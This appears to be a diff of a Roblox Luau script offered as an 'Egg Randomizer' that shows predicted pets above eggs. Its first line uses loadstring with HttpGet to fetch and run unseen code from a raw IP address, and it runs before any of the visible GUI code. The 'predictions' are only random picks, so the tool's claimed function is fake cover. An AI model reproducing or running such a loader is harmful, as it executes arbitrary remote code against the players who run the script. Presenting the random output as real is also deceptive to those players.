@@ -1,2 +1,258 @@
 ID="ceb16f4d-8272-42f5-9a09-9fc2208035b0";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))() -- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+
+repeat wait() until game:IsLoaded()
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local Tween = game:GetService("TweenService")
+local LP = Players.LocalPlayer
+local PG = LP:WaitForChild("PlayerGui")
+
+-- Theme Colors & Design Assets
+local BROWN_BG = Color3.fromRGB(118,61,25)
+local BROWN_LIGHT = Color3.fromRGB(164,97,43)
+local BROWN_BORDER = Color3.fromRGB(51,25,0)
+local ACCENT_GREEN = Color3.fromRGB(110,196,99)
+local BUTTON_GRAY = Color3.fromRGB(190,190,190)
+local BUTTON_BLUE = Color3.fromRGB(66,150,255)
+local BUTTON_BLUE_HOVER = Color3.fromRGB(85,180,255)
+local BUTTON_GREEN = Color3.fromRGB(85,200,85)
+local BUTTON_GREEN_HOVER = Color3.fromRGB(120,230,120)
+local BUTTON_RED = Color3.fromRGB(255,62,62)
+local BUTTON_RED_HOVER = Color3.fromRGB(255,100,100)
+local FONT = Enum.Font.FredokaOne
+local TILE_IMAGE = "rbxassetid://15910695828"
+
+-- Pet Data
+local eggToPets = {
+    ["Common Egg"] = {"Dog", "Bunny", "Golden Lab"},
+    ["Uncommon Egg"] = {"Black Bunny", "Chicken", "Cat", "Deer"},
+    ["Rare Egg"] = {"Orange Tabby", "Spotted Deer", "Pig", "Rooster", "Monkey"},
+    ["Legendary Egg"] = {"Cow", "Silver Monkey", "Sea Otter", "Turtle", "Polar Bear"},
+    ["Mythic Egg"] = {"Grey Mouse", "Brown Mouse", "Squirrel", "Red Giant Ant", "Red Fox"},
+    ["Bug Egg"] = {"Snail", "Giant Ant", "Caterpillar", "Praying Mantis", "Dragon Fly"},
+    ["Night Egg"] = {"Hedgehog", "Mole", "Frog", "Echo Frog", "Night Owl", "Raccoon"},
+    ["Bee Egg"] = {"Bee", "Honey Bee", "Bear Bee", "Petal Bee", "Queen Bee"},
+    ["Anti Bee Egg"] = {"Wasp", "Tarantula Hawk", "Moth", "Butterfly", "Disco Bee"},
+    ["Common Summer Egg"] = {"Starfish", "Seafull", "Crab"},
+    ["Rare Summer Egg"] = {"Flamingo", "Toucan", "Sea Turtle", "Orangutan", "Seal"},
+    ["Paradise Egg"] = {"Ostrich", "Peacock", "Capybara", "Scarlet Macaw", "Mimic Octopus"},
+    ["Premium Night Egg"] = {"Hedgehog", "Mole", "Frog", "Echo Frog"},
+    ["Primal Egg"] = {"Parasaurolophus", "Iguanodon", "Pachycephalosaurus", "Dilophosaurus", "Ankylosaurus", "Spinosaurus"},
+    ["Dinosaur Egg"] = {"T-Rex", "Brontosaurus", "Triceratops", "Velociraptor"},
+}
+
+-- ESP System
+local espList = {}
+local function clearESP()
+    for _, g in ipairs(espList) do if g.Parent then g:Destroy() end end
+    espList = {}
+end
+
+local function blink(label)
+    spawn(function()
+        while label and label.Parent do
+            Tween:Create(label, TweenInfo.new(0.25), {TextColor3=Color3.fromRGB(0,255,0)}):Play()
+            wait(0.25)
+            Tween:Create(label, TweenInfo.new(0.25), {TextColor3=Color3.fromRGB(60,200,60)}):Play()
+            wait(0.25)
+        end
+    end)
+end
+
+local function createESP(part, eggName, petName)
+    if part:FindFirstChild("EggESP") then return end
+    local gui = Instance.new("BillboardGui", part)
+    gui.Name = "EggESP"
+    gui.Size = UDim2.new(0,160,0,40)
+    gui.StudsOffset = Vector3.new(0,2.5,0)
+    gui.Adornee = part
+    gui.AlwaysOnTop = true
+
+    local lbl = Instance.new("TextLabel", gui)
+    lbl.Size = UDim2.new(1,0,1,0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = eggName.." | "..petName
+    lbl.TextColor3 = Color3.fromRGB(200,255,200)
+    lbl.TextStrokeColor3 = Color3.fromRGB(0,0,0)
+    lbl.TextStrokeTransparency = 0.4
+    lbl.Font = FONT
+    lbl.TextScaled = true
+
+    if petName == eggToPets[eggName][#eggToPets[eggName]] then blink(lbl) end
+    table.insert(espList, gui)
+end
+
+local function getPet(egg, forceRare, blockRare)
+    local pool = eggToPets[egg]
+    if not pool then return "Unknown" end
+    if forceRare then return pool[#pool] end
+    if blockRare then return pool[math.random(1, #pool - 1)] end
+    return pool[math.random(1, #pool)]
+end
+
+local function randomize(forceRare, blockRare)
+    clearESP()
+    local found = {}
+    for _, mdl in ipairs(Workspace:GetDescendants()) do
+        if mdl:IsA("Model") and eggToPets[mdl.Name] then
+            local part = mdl:FindFirstChildWhichIsA("BasePart")
+            if part then
+                local pet = getPet(mdl.Name, forceRare, blockRare)
+                createESP(part, mdl.Name, pet)
+                if pet == eggToPets[mdl.Name][#eggToPets[mdl.Name]] then
+                    table.insert(found, mdl.Name.." | "..pet)
+                end
+            end
+        end
+    end
+    return found
+end
+
+-- GUI Setup
+local gui2 = Instance.new("ScreenGui", PG)
+gui2.Name = "KuniEggGUI"
+
+local f = Instance.new("Frame", gui2)
+f.Size = UDim2.new(0, 260, 0, 180)
+f.Position = UDim2.new(0.5, -130, 0.5, -90)
+f.BackgroundColor3 = BROWN_BG
+f.Active = true
+f.Draggable = true
+Instance.new("UICorner", f).CornerRadius = UDim.new(0, 10)
+Instance.new("UIStroke", f).Color = BROWN_BORDER
+Instance.new("UIStroke", f).Thickness = 2
+
+-- Tile background
+local tile = Instance.new("ImageLabel", f)
+tile.Size = UDim2.new(1, 0, 1, 0)
+tile.Image = TILE_IMAGE
+tile.BackgroundTransparency = 1
+tile.ScaleType = Enum.ScaleType.Tile
+tile.TileSize = UDim2.new(0, 96, 0, 96)
+
+-- Header
+local header = Instance.new("Frame", f)
+header.Size = UDim2.new(1, 0, 0, 30)
+header.BackgroundColor3 = ACCENT_GREEN
+header.BorderSizePixel = 0
+Instance.new("UICorner", header).CornerRadius = UDim.new(0, 10)
+local headerText = Instance.new("TextLabel", header)
+headerText.Size = UDim2.new(1, -30, 1, 0)
+headerText.Position = UDim2.new(0, 8, 0, 0)
+headerText.Text = "Egg Randomizer"
+headerText.Font = FONT
+headerText.TextColor3 = Color3.new(1,1,1)
+headerText.BackgroundTransparency = 1
+headerText.TextScaled = true
+headerText.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Close Button
+local btnX = Instance.new("TextButton", header)
+btnX.Size = UDim2.new(0, 20, 0, 20)
+btnX.Position = UDim2.new(1, -28, 0.5, -10)
+btnX.BackgroundColor3 = BUTTON_RED
+btnX.Text = "X"
+btnX.Font = FONT
+btnX.TextColor3 = Color3.new(1,1,1)
+btnX.TextScaled = true
+btnX.TextStrokeTransparency = 0.3
+Instance.new("UICorner", btnX)
+btnX.MouseEnter:Connect(function() btnX.BackgroundColor3 = BUTTON_RED_HOVER end)
+btnX.MouseLeave:Connect(function() btnX.BackgroundColor3 = BUTTON_RED end)
+btnX.MouseButton1Click:Connect(function() gui2:Destroy() end)
+
+-- Status Label
+local status = Instance.new("TextLabel", f)
+status.Size = UDim2.new(1, -20, 0, 24)
+status.Position = UDim2.new(0, 10, 0, 40)
+status.Font = FONT
+status.TextSize = 16
+status.TextColor3 = ACCENT_GREEN
+status.BackgroundTransparency = 1
+status.TextScaled = false
+status.Text = ""
+
+local function animateStatus(label, baseText, duration)
+    spawn(function()
+        local start, dots, i = tick(), {".","..","..."}, 1
+        while tick() - start < duration and label.Parent do
+            label.Text = baseText..dots[i]
+            i = i % #dots + 1
+            wait(0.5)
+        end
+    end)
+end
+
+-- Buttons
+local canClick = true
+
+local function makeBtn(parent, text, y, color, hoverColor, callback)
+    local btn = Instance.new("TextButton", parent)
+    btn.Size = UDim2.new(0.9, 0, 0, 30)
+    btn.Position = UDim2.new(0.05, 0, 0, y)
+    btn.Text = text
+    btn.Font = FONT
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.BackgroundColor3 = color
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 7)
+    Instance.new("UIStroke", btn).Color = BROWN_BORDER
+    btn.TextScaled = true
+    btn.MouseEnter:Connect(function() btn.BackgroundColor3 = hoverColor end)
+    btn.MouseLeave:Connect(function() btn.BackgroundColor3 = color end)
+    btn.MouseButton1Click:Connect(callback)
+    return btn
+end
+
+makeBtn(f, "Manual Randomizer", 80, BUTTON_GREEN, BUTTON_GREEN_HOVER, function()
+    if not canClick then return end
+    canClick = false
+    animateStatus(status, "🔄 Randomizing", 2)
+    randomize(false,false)
+    wait(2)
+    status.Text = ""
+    canClick = true
+end)
+
+makeBtn(f, "Auto Randomizer", 115, BUTTON_BLUE, BUTTON_BLUE_HOVER, function()
+    if not canClick then return end
+    canClick = false
+    animateStatus(status, "🔄 Randomizing", 40)
+    local start = tick()
+    while tick() - start < 40 do randomize(false,true); wait(2) end
+    local rares = randomize(true,false)
+    if #rares > 0 then status.Text = "✅ Found:\n"..table.concat(rares,"\n") else status.Text = "✅ Found Rare Pet" end
+    wait(3); status.Text = ""
+    canClick = true
+end)
+
+-- Footer
+local footer = Instance.new("TextLabel", f)
+footer.Size = UDim2.new(1, -10, 0, 16)
+footer.Position = UDim2.new(0, 5, 1, -18)
+footer.BackgroundTransparency = 1
+footer.Text = "Made by Kuni"
+footer.Font = FONT
+footer.TextColor3 = Color3.new(1, 1, 1)
+footer.TextStrokeTransparency = 0.5
+footer.TextScaled = true
+
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
